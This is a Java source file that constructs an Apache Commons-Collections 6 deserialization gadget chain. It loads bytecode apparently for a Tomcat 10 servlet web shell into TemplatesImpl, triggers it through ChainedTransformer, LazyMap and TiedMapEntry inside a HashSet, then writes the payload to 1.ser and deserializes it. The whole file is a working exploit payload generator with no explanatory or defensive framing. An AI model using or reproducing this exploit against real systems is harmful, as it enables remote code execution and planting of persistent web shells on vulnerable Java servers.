package classloader;
import java.io.*;
import java.lang.reflect.Field;
import java.util.*;
import javax.xml.transform.Templates;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;


public class TemplatesImplCC6 {
    public static void main(String[] args) throws Exception {
    	FileInputStream inputFromFile = new FileInputStream("D:\\workspace\\javareadobject\\bin\\test\\"
    			+ "TemplatesImplTomcat10ServletShell.class");
        byte[] bs = new byte[inputFromFile.available()];
        inputFromFile.read(bs);
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bs});
        setFieldValue(obj, "_name", "TemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { obj })
        };
    	Transformer transformerChain = new ChainedTransformer(transformers);
    	Map innerMap = new HashMap();
    	Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    	TiedMapEntry entry = new TiedMapEntry(lazyMap, java.lang.Runtime.class);
    	HashSet map = new HashSet(1);
    	map.add("foo");
    	HashMap innimpl = (HashMap) getFieldValue(map, "map");
    	Object array[] = (Object[])(Object[])getFieldValue(innimpl, "table");
    	Object node;
    	try {
    		node = array[1];
		} catch (Exception e) {
			node = array[0];
		}
	setFieldValue(node, "key", entry);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));
        oos.writeObject(map);
	ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));
        ois.readObject();

    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }
}
